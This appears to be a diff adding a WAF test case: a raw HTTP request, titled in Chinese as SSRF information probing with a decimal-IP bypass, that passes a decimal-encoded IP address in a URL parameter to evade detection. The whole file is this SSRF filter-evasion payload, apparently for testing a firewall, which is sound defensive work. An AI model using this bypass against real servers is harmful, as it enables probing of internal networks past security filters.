@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_信息探测(IP十进制绕过)-06506964
+# 将IP地址转化为十进制数从而绕过检测
+GET /?id=http:%2F%2F2633305131&bid=hd_tag_m8mv24mx HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mx
+RM-PRO-Token: 357cec3869a508f5cd6da0a5903fd43f
+RM-PRO-Time: 1742808393216
+User-Agent: curl/7.83.1
+
